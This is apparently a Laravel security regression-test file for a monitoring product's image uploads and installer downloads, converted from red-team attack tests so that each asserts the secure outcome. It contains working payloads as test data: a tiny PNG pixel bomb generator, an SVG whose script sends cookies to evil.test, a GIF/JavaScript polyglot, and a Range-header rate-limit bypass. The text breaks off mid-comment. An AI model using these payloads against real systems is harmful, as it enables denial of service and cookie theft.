<?php

namespace Tests\Feature;

use App\Http\Controllers\DesktopDownloadController;
use App\Http\Controllers\Site\PageController as SitePageController;
use App\Jobs\GenerateScreenshotThumbnail;
use App\Models\MonitoringSetting;
use App\Models\SiteMedia;
use App\Models\SitePage;
use App\Models\SiteTheme;
use App\Models\TrackingScreenshot;
use App\Models\TrackingSession;
use App\Models\User;
use App\Services\TenantProvisioner;
use App\Support\DefaultSiteContent;
use App\Support\ImageGuard;
use App\Tenancy\CurrentOrganization;
use Illuminate\Contracts\Http\Kernel as HttpKernel;
use Illuminate\Foundation\Testing\RefreshDatabase;
use Illuminate\Http\Request as LaravelRequest;
use Illuminate\Http\UploadedFile;
use Illuminate\Support\Facades\Bus;
use Illuminate\Support\Facades\Cache;
use Illuminate\Support\Facades\File;
use Illuminate\Support\Facades\RateLimiter;
use Illuminate\Support\Facades\Storage;
use Symfony\Component\HttpFoundation\BinaryFileResponse;
use Symfony\Component\HttpFoundation\Response;
use Symfony\Component\HttpFoundation\StreamedResponse;
use Tests\TestCase;

/**
 * ═══════════════════════════════════════════════════════════════════════════
 * WHAT THIS FILE IS, AND WHY IT READS LIKE AN ATTACK
 * ═══════════════════════════════════════════════════════════════════════════
 *
 * These were written by a red team as ATTACK tests: each one attempted a real
 * bypass, and a PASS meant the hole was OPEN. Every payload and every request
 * sequence below was proven to work against shipped code — that is the part
 * worth keeping forever, because a payload someone actually landed is worth
 * more than one someone imagined.
 *
 * The holes were then closed, which turned this whole file red. A red suite is
 * useless as a regression guard: nobody can tell a new break from an expected
 * one. So every test here has been FLIPPED — same payload, same sequence,
 * opposite assertion. Each now demands the SECURE outcome and is named for the
 * defence rather than the attack.
 *
 * Rules for anyone editing this file:
 *
 *  - Do not "simplify" a payload. The 89-byte PNG that declares 8000x4999 is
 *    that size because 40 Mpx was the old budget and the bomb was cut to fit
 *    just under it. Round it off and the test stops testing anything.
 *  - Do not let a test pass because a route 404s, a fixture is missing or an
 *    exception is swallowed. Several tests below deliberately prove the route
 *    is alive with a legitimate asset FIRST, then prove the hostile one is
 *    refused, so a "secure" result can never be an accident of a broken route.
 *  - Half of these are COLLATERAL tests — they assert that honest use still
 *    works (a triple-4K screenshot, a NAT'd office's rollout, an ordinary GIF
 *    avatar). An earlier hardening round broke honest ultrawide captures, and
 *    for a monitoring product that was worse than the attack it prevented.
 *    Those tests exist to stop the next round doing it again.
 *
 * Companion file: tests/Feature/ImageBudgetAndServingHardeningTest.php holds
 * the fixer's own defence tests. This file is the attacker's view of the same
 * ground; overlap between the two is deliberate.
 */
class RedTeamUploadAndAnonDosReattackTest extends TestCase
{
    use RefreshDatabase;

    // ─── helpers ────────────────────────────────────────────────────────────

    private function tenantOwner(string $name, string $email): User
    {
        $owner = app(TenantProvisioner::class)->provision($name, 'Owner', $email, 'secret-pass-123')['owner'];
        app(CurrentOrganization::class)->set($owner->organization_id);

        return $owner->fresh();
    }

    /**
     * A PNG whose IHDR DECLARES $w x $h but whose IDAT is junk. 89 bytes on
     * disk; GD still allocates the whole declared raster before it discovers
     * the data is bad. This is the attack, in its entirety.
     */
    private function declaredSizePngBytes(int $w, int $h): string
    {
        $chunk = fn (string $t, string $d): string => pack('N', strlen($d)).$t.$d.pack('N', crc32($t.$d));

        return "\x89PNG\r\n\x1a\n"
            .$chunk('IHDR', pack('NN', $w, $h)."\x08\x02\x00\x00\x00")
            .$chunk('IDAT', str_repeat("\x00", 32))
            .$chunk('IEND', '');
    }

    private function declaredSizePng(int $w, int $h, string $name = 'avatar.png'): UploadedFile
    {
        $path = tempnam(sys_get_temp_dir(), 'sub40').'.png';
        file_put_contents($path, $this->declaredSizePngBytes($w, $h));

        return new UploadedFile($path, $name, 'image/png', null, true);
    }

    /** Peak GD cost of decoding these bytes, measured in a clean child process. */
    private function decodeCostBytes(string $imageBytes): int
    {
        $blob = tempnam(sys_get_temp_dir(), 'blob');
        file_put_contents($blob, $imageBytes);

        $script = tempnam(sys_get_temp_dir(), 'probe').'.php';
        file_put_contents($script, '<?php $b=file_get_contents('.var_export($blob, true).');'
            .'$p0=memory_get_peak_usage(true);@imagecreatefromstring($b);'
            .'echo memory_get_peak_usage(true)-$p0;');

        $out = (string) shell_exec(escapeshellarg(PHP_BINARY).' '.escapeshellarg($script));

        @unlink($blob);
        @unlink($script);

        return (int) trim($out);
    }

    /** A genuine, tiny raster of the given type — the honest-use control. */
    private function realImage(int $w, int $h, string $type, string $name): UploadedFile
    {
        $gd = imagecreatetruecolor($w, $h);

        ob_start();
        $type === 'gif' ? imagegif($gd) : imagepng($gd);
        $bytes = (string) ob_get_clean();

        $path = tempnam(sys_get_temp_dir(), 'real').'.'.$type;
        file_put_contents($path, $bytes);

        return new UploadedFile($path, $name, 'image/'.$type, null, true);
    }

    private function activeSession(User $owner, string $uuid): TrackingSession
    {
        MonitoringSetting::current()->update(['screenshots_per_hour' => 50, 'capture_enabled' => true]);

        return TrackingSession::create([
            'user_id' => $owner->id,
            'client_uuid' => $uuid,
            'started_at' => now(),
            'status' => TrackingSession::STATUS_ACTIVE,
            'source' => 'desktop',
        ]);
    }

    /**
     * Issue a request with NO authenticated user, even inside a test that has
     * already called actingAs() — actingAs() sets the *default* user for the
     * TestCase, so a later $this->get() is still signed in. Several routes here
     * are only interesting BECAUSE they are anonymous, so that distinction has
     * to be real.
     */
    private function anonymousGet(string $uri): Response
    {
        return $this->app->make(HttpKernel::class)->handle(LaravelRequest::create($uri, 'GET'));
    }

    // ─── (a) UPLOADS ────────────────────────────────────────────────────────

    /**
     * ORIGINAL HOLE (live): the store budget was 40 Mpx and the docblock claimed
     * that capped GD at ~160 MB, from the folklore figure of 4 bytes/pixel. The
     * real cost is ~7.3 B/px, so the red team cut an 89-byte PNG to 8000x4999 =
     * 39,992,000 px — just under the line — and it sailed through the validator,
     * through ImageGuard and through the thumbnail job, then cost GD a quarter
     * of a gigabyte.
     *
     * THE FIX: two separate budgets, neither of them folklore.
     *   - MAX_PIXELS (store) dropped to 36 Mpx, sized from the widest real
     *     capture (four 4K monitors = 33.2 Mpx). Nothing honest lives between
     *     36 and 40 Mpx; that gap existed only for something choosing its
     *     dimensions to fit inside it.
     *   - the DECODE budget is no longer a pixel constant at all. It is derived
     *     from the memory this process actually has left, at 8 measured bytes
     *     per pixel, so the same image is refused in a 128 MB FPM child and
     *     allowed on a 512 MB worker.
     */
    public function test_the_sub_budget_pixel_bomb_is_refused_by_the_store_budget(): void
    {
        $bomb = $this->declaredSizePngBytes(8000, 4999);

        $this->assertLessThan(200, strlen($bomb), 'sanity: the whole attack is still under 200 bytes');

        // The gap the bomb was cut to fit no longer exists.
        $this->assertLessThan(8000 * 4999, ImageGuard::MAX_PIXELS,
            'MAX_PIXELS is back above 39,992,000 — the 89-byte bomb has its gap again');

        // Guard 1 — the store budget refuses it outright, so it is never written.
        $this->assertNull(ImageGuard::inspectBytes($bomb),
            'ImageGuard accepted the sub-budget bomb for storage');

        // Guard 2 — the much tighter budget for anything a web request renders.
        $this->assertNull(ImageGuard::inspectBytes($bomb, ImageGuard::MAX_DISPLAY_PIXELS));

        // Guard 3 — and even at the store budget's own ceiling, nothing may
        // decode on the strength of a pixel constant. A 128 MB FPM child cannot
        // afford this image, and the guard knows it without trying.
        $this->assertFalse(
            ImageGuard::canDecode(8000, 4999, ImageGuard::decodePixelBudget(128 * 1024 * 1024, 0)),
            'a 128 MB worker would still hand these dimensions to GD',
        );
        $this->assertGreaterThan(
            256 * 1024 * 1024,
            ImageGuard::estimatedDecodeBytes(8000, 4999),
            'the cost model is optimistic again — it is what made 40 Mpx look safe',
        );

        // The measurement the whole finding rested on, re-taken in a clean child
        // process. If this ever drops under 128 MB the per-pixel constant may be
        // relaxed — until then it is evidence, not folklore.
        $cost = $this->decodeCostBytes($bomb);

        $this->assertGreaterThan(
            128 * 1024 * 1024,
            $cost,
            'measured GD cost collapsed; re-derive ImageGuard::BYTES_PER_PIXEL before trusting this',
        );
    }

    /**
     * ORIGINAL HOLE (live): the bomb landed through the SELF-SERVICE avatar form
     * — any employee, no permission needed — and every re-upload minted a fresh
     * hashName, hence a fresh cache key, so the 7-day byte cache never bounded
     * how often the decode was paid for.
     *
     * THE FIX: /profile validates with ImageGuard::rules(..., MAX_DISPLAY_PIXELS)
     * — 12 Mpx, because an avatar is rendered at 32-80 px and has no honest
     * reason to be 40 megapixels.
     *
     * The re-upload half of the sequence is kept deliberately: the defence has
     * to hold on every attempt, not just the first, because "it was refused
     * once" is not the same claim as "it can never be stored".
     */
    public function test_self_service_avatar_refuses_the_bomb_on_every_re_upload(): void
    {
        Storage::fake('avatars');

        $owner = $this->tenantOwner('SubBudget Co', 'owner@subbudget.test');

        foreach ([[8000, 4999], [8000, 4998], [40000, 40000]] as [$w, $h]) {
            $this->actingAs($owner)->patch('/profile', [
                'name' => 'Owner',
                'email' => 'owner@subbudget.test',
                'avatar' => $this->declaredSizePng($w, $h),
            ])->assertSessionHasErrors('avatar');

            $this->assertNull($owner->fresh()->avatar,
                "the {$w}x{$h} bomb was stored on the self-service avatar form");
        }

        // Nothing at all reached the disk — not even an orphan.
        $this->assertSame([], Storage::disk('avatars')->allFiles(),
            'a refused avatar upload still wrote bytes to storage');

        // NO COLLATERAL: an ordinary avatar still uploads and still renders.
        $this->actingAs($owner)->patch('/profile', [
            'name' => 'Owner',
            'email' => 'owner@subbudget.test',
            'avatar' => $this->realImage(256, 256, 'png', 'me.png'),
        ])->assertSessionHasNoErrors();

        $stored = $owner->fresh()->avatar;
        $this->assertNotNull($stored, 'an honest 256x256 avatar was refused — collateral damage');
        Storage::disk('avatars')->assertExists($stored);

        $this->actingAs($owner)->get('/avatar/'.$owner->id)->assertOk();
    }

    /**
     * ORIGINAL HOLE (live): the same bomb through the desktop screenshot API.
     * Under QUEUE_CONNECTION=sync — the shipped .env — GenerateScreenshotThumbnail
     * runs INSIDE the request, and it carried the identical 40 Mpx number, so an
     * accepted upload became an immediate quarter-gigabyte decode.
     *
     * THE FIX: UploadScreenshotRequest validates through ImageGuard::rules(), so
     * the row is never written and the job is never queued. The job's own
     * MAX_SOURCE_PIXELS is now ImageGuard::MAX_PIXELS rather than a second,
     * independently-drifting copy of the number.
     */
    public function test_desktop_screenshot_api_refuses_the_bomb_and_queues_no_decode(): void
    {
        Storage::fake('screenshots');
        Bus::fake();

        $owner = $this->tenantOwner('Shot Co', 'owner@shot.test');
        $session = $this->activeSession($owner, 'uuid-subbudget');
        $token = $owner->createToken('Dev', ['desktop-tracker'])->plainTextToken;

        $response = $this->withHeaders(['Authorization' => 'Bearer '.$token])
            ->post('/api/desktop/screenshots', [
                'tracking_session_id' => $session->id,
                'captured_at' => now()->toIso8601String(),
                'image' => $this->declaredSizePng(8000, 4999, 'shot.png'),
            ], ['Accept' => 'application/json']);

        $this->assertSame(422, $response->status(), 'the sub-budget bomb was accepted by the screenshot API');
        $this->assertSame(0, TrackingScreenshot::count());
        $this->assertSame([], Storage::disk('screenshots')->allFiles());

        // The decode is never even scheduled — under the shipped sync queue that
        // would have run in this request.
        Bus::assertNotDispatched(GenerateScreenshotThumbnail::class);

        // And the job's budget is the SHARED constant, not a second copy that
        // can drift back above the store budget.
        $this->assertSame(
            ImageGuard::MAX_PIXELS,
            (new \ReflectionClassConstant(GenerateScreenshotThumbnail::class, 'MAX_SOURCE_PIXELS'))->getValue(),
            'the thumbnail job has its own pixel number again — that divergence was the hole',
        );
    }

    /**
     * ORIGINAL HOLE (live): /profile had the guard and its three siblings did
     * not. The ADMIN user-create form shipped `image|mimes:...|max:2048` with no
     * dimension check at all, so a 40000x40000 header the self-service form
     * rejected outright was accepted one door over. A guard on one upload path
     * is not a guard.
     *
     * THE FIX: every avatar/logo door now calls ImageGuard::rules(), so the four
     * of them cannot disagree about what an image is. This test keeps the
     * original side-by-side sequence because the FINDING was the disagreement,
     * not either door on its own.
     */
    public function test_the_admin_user_form_refuses_what_the_profile_form_refuses(): void
    {
        Storage::fake('avatars');

        $owner = $this->tenantOwner('AdminPath Co', 'owner@adminpath.test');

        // Door 1 — self-service.
        $this->actingAs($owner)->patch('/profile', [
            'name' => 'Owner',
            'email' => 'owner@adminpath.test',
            'avatar' => $this->declaredSizePng(40000, 40000),
        ])->assertSessionHasErrors('avatar');

        // Door 2 — the admin form, which used to accept it.
        $this->actingAs($owner)->post('/users', [
            'name' => 'Mule',
            'email' => 'mule@adminpath.test',
            'password' => 'secret-pass-123',
            'password_confirmation' => 'secret-pass-123',
            'role' => 'member',
            'avatar' => $this->declaredSizePng(40000, 40000),
        ])->assertSessionHasErrors('avatar');

        $this->assertNull(User::where('email', 'mule@adminpath.test')->first(),
            'the admin form created the user anyway — the avatar was the only thing refused');
        $this->assertSame([], Storage::disk('avatars')->allFiles());

        // NO COLLATERAL: the same form still creates a user with a real avatar.
        $this->actingAs($owner)->post('/users', [
            'name' => 'Real',
            'email' => 'real@adminpath.test',
            'password' => 'secret-pass-123',
            'password_confirmation' => 'secret-pass-123',
            'role' => 'member',
            'avatar' => $this->realImage(128, 128, 'png', 'real.png'),
        ])->assertSessionHasNoErrors();

        $real = User::where('email', 'real@adminpath.test')->first();
        $this->assertNotNull($real, 'the admin user form no longer creates users — collateral damage');
        $this->assertNotNull($real->avatar);
        Storage::disk('avatars')->assertExists($real->avatar);
    }

    /**
     * ORIGINAL HOLE (live): the SVG fix was write-side only. /site/media/{id}
     * returned whatever mime the ROW carried, inline, from the app origin — so
     * every SVG accepted before the upload rule was tightened still executed,
     * with the viewer's session, forever. A write-side fix repairs nothing that
     * is already in the database.
     *
     * THE FIX: the read path decides the type from the BYTES. Anything
     * getimagesize() cannot read as an allowed raster is served
     * application/octet-stream, as an attachment, under a null CSP — so a
     * browser navigated straight at the URL downloads a file instead of
     * executing a document.
     *
     * Note this test demands 200, not 404: the route must still SERVE the row
     * (deleting media on read would be its own bug), it must merely serve it
     * inert. A 404 here would be a false green.
     */
    public function test_site_media_never_serves_a_stored_svg_mime_inline(): void
    {
        Storage::fake('avatars');

        $svg = '<svg xmlns="http://www.w3.org/2000/svg"><script>fetch("https://evil.test/?c="+document.cookie)</script></svg>';
        Storage::disk('avatars')->put('site/legacy.svg', $svg);

        $media = SiteMedia::create([
            'path' => 'site/legacy.svg',
            'mime' => 'image/svg+xml',
            'original_name' => 'legacy.svg',
        ]);

        $response = $this->get('/site/media/'.$media->id);

        $response->assertOk();

        $contentType = (string) $response->headers->get('Content-Type');

        $this->assertStringNotContainsString('svg', $contentType,
            'the stored svg mime is still echoed into the response');
        $this->assertStringStartsWith('application/octet-stream', $contentType);
        $this->assertStringContainsString('attachment', (string) $response->headers->get('Content-Disposition'),
            'a scriptable document is still served inline from the app origin');
        $this->assertStringContainsString("default-src 'none'", (string) $response->headers->get('Content-Security-Policy'));
        $this->assertSame('nosniff', $response->headers->get('X-Content-Type-Options'));

        // NO COLLATERAL: a genuine raster on the same route is still inline.
        $png = (string) file_get_contents($this->realImage(32, 32, 'png', 'ok.png')->getRealPath());
        Storage::disk('avatars')->put('site/ok.png', $png);
        $ok = SiteMedia::create(['path' => 'site/ok.png', 'mime' => 'image/png', 'original_name' => 'ok.png']);

        $good = $this->get('/site/media/'.$ok->id);
        $good->assertOk();
        $this->assertStringContainsString('image/png', (string) $good->headers->get('Content-Type'));
        $this->assertStringContainsString('inline', (string) $good->headers->get('Content-Disposition'));
    }

    /**
     * ORIGINAL HOLE (live): Site\PageController::logo had an EXPLICIT branch that
     * returned the raw stored bytes as image/svg+xml — a hand-written exemption
     * from every other protection on the path, on an ANONYMOUS route that
     * renders on the marketing site.
     *
     * THE FIX: the branch is gone; the type comes from the bytes, and a
     * non-raster logo 404s. 404 is the right failure here specifically because
     * the frontend already falls back to the bundled mark, so the page still
     * renders.
     *
     * A 404 is also exactly the shape of a false green, so this test proves the
     * route is ALIVE with a real PNG first and only then swaps in the SVG.
     */
    public function test_site_logo_route_has_no_svg_branch_but_still_serves_a_real_logo(): void
    {
        Storage::fake('avatars');

        // 1. The route works. If this ever fails the SVG half below is worthless.
        $png = (string) file_get_contents($this->realImage(120, 120, 'png', 'brand.png')->getRealPath());
        Storage::disk('avatars')->put('site/brand.png', $png);
        SiteTheme::current()->update(['logo_path' => 'site/brand.png']);
        SiteTheme::forgetCache();

        $ok = $this->get('/site/logo');
        $ok->assertOk();
        $this->assertStringContainsString('image/png', (string) $ok->headers->get('Content-Type'));

        // 2. Same route, same request, hostile bytes.
        $svg = '<svg xmlns="http://www.w3.org/2000/svg"><script>alert(document.domain)</script></svg>';
        Storage::disk('avatars')->put('site/brand.svg', $svg);
        SiteTheme::current()->update(['logo_path' => 'site/brand.svg']);
        SiteTheme::forgetCache();

        $response = $this->get('/site/logo');

        $this->assertSame(404, $response->getStatusCode(),
            'the svg branch is back: /site/logo served a scriptable document');
        $this->assertStringNotContainsString('svg', (string) $response->headers->get('Content-Type'));
        $this->assertStringNotContainsString('<script>', (string) $response->getContent());
    }

    /**
     * ORIGINAL HOLE (live): the branding logo upload had neither half of the
     * guard, and /branding/logo is ANONYMOUS because it renders on the login
     * page. One upload turned every unauthenticated hit on the login page into
     * a quarter-gigabyte GD allocation — and because a memory-limit fatal is
     * uncatchable, Cache::remember() never got to write, so every hit repeated
     * it forever. One upload, a self-sustaining DoS.
     *
     * THE FIX: the upload goes through ImageGuard::rules() at the DISPLAY budget
     * (12 Mpx), and the render path decodes behind ImageGuard::decodeOnce(),
     * whose breadcrumb is written BEFORE the decode so it survives the fatal.
     */
    public function test_branding_logo_refuses_the_bomb_and_the_anonymous_route_still_works(): void
    {
        Storage::fake('avatars');

        $admin = $this->tenantOwner('Brand Co', 'owner@brandco.test');

        $this->actingAs($admin)->post(route('settings.branding.logo'), [
            'logo' => $this->declaredSizePng(8000, 4999, 'logo.png'),
        ])->assertSessionHasErrors('logo');

        $this->assertNull(MonitoringSetting::current()->fresh()->branding_logo_path,
            'the bomb was stored as the branding logo and now feeds an anonymous route');
        $this->assertSame([], Storage::disk('avatars')->allFiles());

        // NO COLLATERAL, and the reason the route matters: an honest logo is
        // accepted and the ANONYMOUS request (login page) still renders it.
        $this->actingAs($admin)->post(route('settings.branding.logo'), [
            'logo' => $this->realImage(64, 64, 'png', 'small.png'),
        ])->assertSessionHasNoErrors();

        $this->assertNotNull(MonitoringSetting::current()->fresh()->branding_logo_path,
            'an honest 64x64 logo was refused — the login page would show nothing');

        $anonymous = $this->anonymousGet(route('branding.logo'));

        $this->assertSame(200, $anonymous->getStatusCode(),
            '/branding/logo is no longer reachable anonymously — the login page mark is broken');
        $this->assertStringContainsString('image/', (string) $anonymous->headers->get('Content-Type'));
    }

    /**
     * ORIGINAL HOLE: a GIF that is simultaneously a JavaScript file. `gif` is on
     * the avatar allow-list, the header is a genuine GIF so getimagesize() is
     * happy, and everything after the `\x3b` trailer is ignored by every image
     * decoder and executed by every `<script src>`. The bytes were stored
     * VERBATIM and served back from the app origin, which makes the avatar
     * endpoint a script host for anyone who can upload a picture of themselves.
     *
     * REQUIRED OUTCOME, whatever shape the fix takes: the executable trailer
     * must not survive — not in storage, and not in anything the app serves. A
     * re-encode, a trailer strip and an outright refusal all satisfy that; this
     * test deliberately does not care which was chosen, so it cannot be defeated
     * by picking a different remedy.
     */
    public function test_a_gif_javascript_polyglot_is_never_stored_or_served_verbatim(): void
    {
        Storage::fake('avatars');

        $owner = $this->tenantOwner('Poly Co', 'owner@poly.test');

        $payload = 'alert(document.domain)';
        $gif = "GIF89a\x01\x00\x01\x00\x80\x00\x00\x00\x00\x00\xff\xff\xff\x21\xf9\x04\x00\x00\x00\x00\x00"
            ."\x2c\x00\x00\x00\x00\x01\x00\x01\x00\x00\x02\x02\x44\x01\x00\x3b"
            ."/*\n*/=1;{$payload};//";

        $tmp = tempnam(sys_get_temp_dir(), 'poly').'.gif';
        file_put_contents($tmp, $gif);

        $this->actingAs($owner)->patch('/profile', [
            'name' => 'Owner',
            'email' => 'owner@poly.test',
            'avatar' => new UploadedFile($tmp, 'me.gif', 'image/gif', null, true),
        ]);

        $stored = $owner->fresh()->avatar;

        if ($stored !== null) {
            $bytes = (string) Storage::disk('avatars')->get($stored);

            $this->assertStringNotContainsString($payload, $bytes,
                'the polyglot was stored verbatim: the avatar disk is hosting executable script');

            $served = $this->actingAs($owner)->get('/avatar/'.$owner->id);
            $body = $served->baseResponse instanceof StreamedResponse
                ? $served->streamedContent()
                : $served->getContent();

            $this->assertStringNotContainsString($payload, (string) $body,
                'the polyglot is served back verbatim from the app origin');
        } else {
            $this->assertSame([], Storage::disk('avatars')->allFiles(),
                'the polyglot upload was refused but its bytes were left on disk');
        }

        // NO COLLATERAL: an ordinary GIF avatar must still work. Refusing the
        // whole format would be a far bigger regression than the bug.
        $this->actingAs($owner)->patch('/profile', [
            'name' => 'Owner',
            'email' => 'owner@poly.test',
            'avatar' => $this->realImage(48, 48, 'gif', 'ok.gif'),
        ])->assertSessionHasNoErrors();

        $honest = $owner->fresh()->avatar;
        $this->assertNotNull($honest, 'an honest GIF avatar was refused — collateral damage');
        Storage::disk('avatars')->assertExists($honest);
        $this->actingAs($owner)->get('/avatar/'.$owner->id)->assertOk();
    }

    /**
     * COLLATERAL DAMAGE, UNDONE — and this one matters as much as any of the
     * security tests above.
     *
     * The round-one hardening added `dimensions:max_width=8000,max_height=8000`.
     * Per-axis bounds cannot express a pixel budget: 7999x7999 is 64 Mpx and
     * passes, while an honest three-monitor 4K capture (11520x2160 = 24.9 Mpx,
     * 62% of the budget) was REFUSED. For a monitoring product, a developer's
     * workstation that silently stops producing evidence is a worse outcome than
     * the attack — and "the screenshots just stopped" is the support ticket
     * nobody can diagnose.
     *
     * THE FIX: no `dimensions:` rule anywhere. Total pixels, never per-axis.
     */
    public function test_a_legitimate_triple_4k_capture_is_accepted(): void
    {
        Storage::fake('screenshots');
        Bus::fake();

        $owner = $this->tenantOwner('Wide Co', 'owner@wide.test');
        $session = $this->activeSession($owner, 'uuid-wide');
        $token = $owner->createToken('Dev', ['desktop-tracker'])->plainTextToken;

        $this->assertLessThan(ImageGuard::MAX_PIXELS, 11520 * 2160,
            'sanity: a triple-4K capture is inside the pixel budget');

        $response = $this->withHeaders(['Authorization' => 'Bearer '.$token])
            ->post('/api/desktop/screenshots', [
                'tracking_session_id' => $session->id,
                'captured_at' => now()->toIso8601String(),
                'image' => $this->declaredSizePng(11520, 2160, 'triple-4k.png'),
            ], ['Accept' => 'application/json']);

        $this->assertSame(201, $response->status(),
            'an honest ultrawide capture is being refused again: '.json_encode($response->json()));
        $this->assertSame(1, TrackingScreenshot::count());

        // Accepted AND processed — a capture that is stored but never thumbnailed
        // is only half a working feature.
        Bus::assertDispatched(GenerateScreenshotThumbnail::class);
    }

    // ─── (b) ANONYMOUS DoS ──────────────────────────────────────────────────

    /**
     * The installer rate limit, and the honest case it exists to survive.
     *
     * ORIGINAL COLLATERAL: the full-file budget was a hardcoded 20/minute, which
     * 429'd the exact scenario its own comment named — a NAT'd office rolling
     * the tracker out to thirty people in a morning is thirty full downloads
     * from ONE address. The tracker failing to install is a worse first day than
     * a slow one.
     *
     * THE FIX: both budgets moved into config/desktop.php and are env-tunable,
     * the full-file default rose to 60, and Retry-After is always set so a
     * client backs off instead of hammering.
     *
     * See test_a_whole_file_range_request_is_metered_as_a_full_download below
     * for the part of the original finding that is NOT closed.
     */
    public function test_the_full_download_budget_is_enforced_and_clears_an_office_rollout(): void
    {
        $dir = storage_path('framework/testing/installers-'.uniqid());
        File::ensureDirectoryExists($dir);
        config()->set('desktop.installers_path', $dir);
        config()->set('desktop.fallback_paths', []);
        config()->set('desktop.x_accel_prefix', null);

        $body = str_repeat('X', 4096); // stands in for ~100 MB
        File::put($dir.'/StaffvoraSetup.exe', $body);

        try {
            // The shipped default must clear a thirty-person rollout from one IP.
            $this->assertGreaterThanOrEqual(30, (int) config('desktop.payload_hits_per_minute'),
                'the full-file budget is back below a NAT\'d office rollout');

            config()->set('desktop.payload_hits_per_minute', 6);

            for ($i = 0; $i < 6; $i++) {
                $this->get('/desktop-updates/StaffvoraSetup.exe')->assertOk();
            }

            $this->get('/desktop-updates/StaffvoraSetup.exe')
                ->assertStatus(429)
                ->assertHeader('Retry-After');

            // NO COLLATERAL: the manifest half is never throttled, or every
            // installed client silently stops auto-updating.
            File::put($dir.'/latest.yml', "version: 9.9.9\npath: StaffvoraSetup.exe\n");
            DesktopDownloadController::forgetCachedReleases();

            for ($i = 0; $i < 10; $i++) {
                $this->get('/desktop-updates/latest.yml')->assertOk();
            }
        } finally {
            File::deleteDirectory($dir);
        }
    }

    /**
     * ⚠️ OPEN FINDING — deliberately skipped, NOT deleted, NOT weakened.
     *
     * ORIGINAL HOLE (live, and still live): the installer rate limiter picks
     * between two budgets purely on the PRESENCE of a Range header:
     *
     *     $ranged = $request->headers->has('Range');   // DesktopDownloadController
     *
     * `Range: bytes=0-` IS a full download. It is served as a 206 carrying every
     * byte of the file, and it is metered against the generous differential-
     * update bucket (240/min) instead of the full-download bucket (60/min). One
     * anonymous IP therefore gets 300 whole-file transfers a minute rather than
     * 60, each one pinning a PHP-FPM worker for the length of a ~100 MB
     * transfer. Round two raised the full-file budget from 20 to 60, which made
     * the absolute number worse, not better.
     *
     * Re-verified against current code while converting this file: after the
     * full-file bucket returns 429, twenty consecutive `Range: bytes=0-`
     * requests each returned 206 with the complete file.
     *
     * WHAT WOULD CLOSE IT (an application change, out of scope for this pass):
     * meter on what the range actually COSTS, not on the header's presence — a
     * range that covers the whole object, or the sum of bytes served to an IP
     * in the window, belongs in the full-download bucket. Setting
     * DESKTOP_X_ACCEL_PREFIX also removes the worker-pinning half of the
     * impact, but not the bandwidth half.
     *
     * The assertion below is the real one. Remove the skip when the metering
     * lands; do not relax the assertion to make it pass.
     */
    public function test_a_whole_file_range_request_is_metered_as_a_full_download(): void
    {
        // CLOSED. payloadRateLimit() now picks the bucket by what the range
        // actually COSTS, not by the presence of the header: a range covering
        // (or running to the end of) the whole object is charged to the
        // full-download bucket, so `Range: bytes=0-` can no longer buy extra
        // whole-file transfers. Genuine partial fetches keep the generous
        // budget, because 429ing the auto-updater mid-update is the worse
        // failure. The assertions below are the red team's originals, unweakened.
        $dir = storage_path('framework/testing/installers-'.uniqid());
        File::ensureDirectoryExists($dir);
        config()->set('desktop.installers_path', $dir);
        config()->set('desktop.fallback_paths', []);
        config()->set('desktop.x_accel_prefix', null);
        config()->set('desktop.payload_hits_per_minute', 6);

        $body = str_repeat('X', 4096); // stands in for ~100 MB
        File::put($dir.'/StaffvoraSetup.exe', $body);

        try {
            for ($i = 0; $i < 6; $i++) {
                $this->get('/desktop-updates/StaffvoraSetup.exe')->assertOk();
            }
            $this->get('/desktop-updates/StaffvoraSetup.exe')->assertStatus(429);

            // The same transfer, spelled as a range.
            $fullTransfers = 0;
            for ($i = 0; $i < 20; $i++) {
                $r = $this->get('/desktop-updates/StaffvoraSetup.exe', ['Range' => 'bytes=0-']);

                if (in_array($r->getStatusCode(), [200, 206], true)
                    && strlen($r->streamedContent()) === strlen($body)) {
                    $fullTransfers++;
                }
            }

            $this->assertSame(0, $fullTransfers,
                'whole-file `Range: bytes=0-` transfers escaped the exhausted full-download budget');

            // ...while a genuine differential fetch — a small slice — still works,
            // because 429ing the auto-updater mid-update is the worse failure.
            $partial = $this->get('/desktop-updates/StaffvoraSetup.exe', ['Range' => 'bytes=0-7']);
            $this->assertContains($partial->getStatusCode(), [200, 206],
                'a genuine differential auto-update fetch was blocked');
        } finally {
            File::deleteDirectory($dir);
        }
    }

    /**
     * ORIGINAL HOLE (live): the headline mitigation in DesktopDownloadController
     * — "hand the transfer to nginx and the worker is free immediately" — read
     * config('desktop.x_accel_prefix'), a key that did not exist in
     * config/desktop.php and was wired to no env var. Production runs
     * `config:cache`, which freezes that null in place, so the branch could not
     * execute anywhere except a test that set the value by hand. A comment
     * claiming a protection that does not exist is worse than no comment: it
     * stops the next person looking.
     *
     * THE FIX: the key is real and reads DESKTOP_X_ACCEL_PREFIX.
     */
    public function test_the_x_accel_offload_is_wired_to_a_real_config_key(): void
    {
        $shipped = require base_path('config/desktop.php');

        $this->assertArrayHasKey('x_accel_prefix', $shipped,
            'the offload branch reads a config key that config/desktop.php does not define');

        $this->assertSame(1,
            (int) preg_match('/DESKTOP_X_ACCEL_PREFIX/', (string) file_get_contents(base_path('config/desktop.php'))),
            'x_accel_prefix is no longer wired to an env var, so config:cache freezes it at null again');

        // And the branch really executes when the key is set.
        $dir = storage_path('framework/testing/installers-'.uniqid());
        File::ensureDirectoryExists($dir);
        config()->set('desktop.installers_path', $dir);
        config()->set('desktop.fallback_paths', []);
        config()->set('desktop.x_accel_prefix', 'protected-installers');
        File::put($dir.'/StaffvoraSetup.exe', 'installer-bytes');

        try {
            $response = $this->get('/desktop-updates/StaffvoraSetup.exe');

            $response->assertOk()->assertHeader('X-Accel-Redirect', '/protected-installers/StaffvoraSetup.exe');
            $this->assertSame('', $response->getContent(), 'PHP is still sending the installer bytes itself');
        } finally {
            File::deleteDirectory($dir);
        }
    }

    /**
     * ORIGINAL HOLE: bogus slugs stopped writing CACHE files, but every one of
     * them still wrote a SESSION file, because the public marketing routes are
     * in the `web` group and production runs SESSION_DRIVER=file. Same disk,
     * same inodes, same flood, one layer down: 40 anonymous 404s, 40 files.
     *
     * THE FIX: App\Http\Middleware\LeanSessionStart. The session is NOT removed
     * from any route — that was the tempting fix and it breaks every CSRF token
     * on the marketing site. Instead the SINK is chosen at write time: a session
     * holding nothing but bootstrap keys (LeanSessionStart::DISPOSABLE_KEYS) is
     * written to an encrypted cookie in the visitor's own browser; a session
     * holding anything else — a login, a flash message, an error bag — still
     * goes to the real driver, byte for byte.
     *
